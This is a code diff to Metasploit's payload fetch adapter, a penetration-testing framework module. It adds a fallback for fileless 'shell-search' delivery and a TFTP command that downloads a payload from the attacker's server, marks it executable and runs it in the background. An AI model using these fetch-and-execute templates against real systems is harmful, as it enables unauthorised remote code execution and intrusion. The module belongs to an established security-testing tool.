@@ -341,10 +341,16 @@ module Msf::Payload::Adapter::Fetch
   # @return [String] The command updated for POSIX execution.
   def _execute_nix(get_file_cmd)
     return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
-    return _generate_fileless_bash_search(get_file_cmd) if datastore['FETCH_FILELESS'] == 'shell-search'
     return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
 
-    cmds = get_file_cmd
+    if datastore['FETCH_FILELESS'] == 'shell-search'
+      cmds = _generate_fileless_bash_search(get_file_cmd)
+      cmds << "f=#{_remote_destination_nix(failsafe: true)};"
+      cmds << get_file_cmd
+    else
+      cmds = get_file_cmd
+    end
+
     cmds << ";chmod +x #{_remote_destination_nix}"
     cmds << ";#{_remote_destination_nix}&"
     cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
@@ -452,13 +458,14 @@ module Msf::Payload::Adapter::Fetch
         fetch_command = _execute_win("tftp -i #{srvhost} GET #{uri} #{_remote_destination}")
       else
         _check_tftp_file
+        tftp_fetch_and_exec = "(echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &"
         if datastore['FETCH_FILELESS'] != 'none' && linux?
           get_file_cmd = "(echo binary ; echo get #{uri} $f ) | tftp #{srvhost}"
           return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
-          return _generate_fileless_bash_search(get_file_cmd) if datastore['FETCH_FILELESS'] == 'shell-search'
+          return "#{_generate_fileless_bash_search(get_file_cmd)} #{tftp_fetch_and_exec}" if datastore['FETCH_FILELESS'] == 'shell-search'
           return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
         else
-          fetch_command = "(echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &"
+          fetch_command = tftp_fetch_and_exec
         end
       end
     else
@@ -515,10 +522,10 @@ module Msf::Payload::Adapter::Fetch
   # Returns or memoizes the remote payload destination for POSIX targets.
   #
   # @return [String] The POSIX destination path or fileless placeholder.
-  def _remote_destination_nix
-    return @remote_destination_nix unless @remote_destination_nix.nil?
+  def _remote_destination_nix(failsafe: false)
+    return @remote_destination_nix unless @remote_destination_nix.nil? || failsafe == true
 
-    if datastore['FETCH_FILELESS'] != 'none'
+    if datastore['FETCH_FILELESS'] != 'none' && failsafe == false
       @remote_destination_nix = '$f'
     else
       writable_dir = datastore['FETCH_WRITABLE_DIR']
@@ -527,6 +534,8 @@ module Msf::Payload::Adapter::Fetch
       payload_filename = datastore['FETCH_FILENAME']
       payload_filename = srvuri if payload_filename.blank?
       payload_path = writable_dir + payload_filename
+      return payload_path if failsafe
+
       @remote_destination_nix = payload_path
     end
     @remote_destination_nix
